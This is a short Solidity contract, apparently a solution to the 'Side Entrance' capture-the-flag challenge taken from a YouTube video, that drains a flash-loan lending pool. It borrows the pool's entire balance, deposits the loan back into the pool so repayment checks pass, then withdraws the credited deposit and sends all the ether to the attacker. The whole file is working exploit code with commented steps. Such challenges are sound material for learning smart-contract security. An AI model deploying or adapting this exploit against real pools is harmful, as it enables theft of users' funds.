// from https://www.youtube.com/watch?v=CYGQAnd-Qx4
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    address immutable attacker;
    IPool immutable pool;

    constructor(address _poolAddress) {
        attacker = msg.sender;
        pool = IPool(_poolAddress);
    }

    // 1. check the balance of the pool
    // 2. borrow all the balance
    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    // 3. deposit the borred money to the pool
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    // 4. withdraw all the money that "deposited" earlier on
    receive() external payable {
        payable(attacker).transfer(address(this).balance);
    }
}
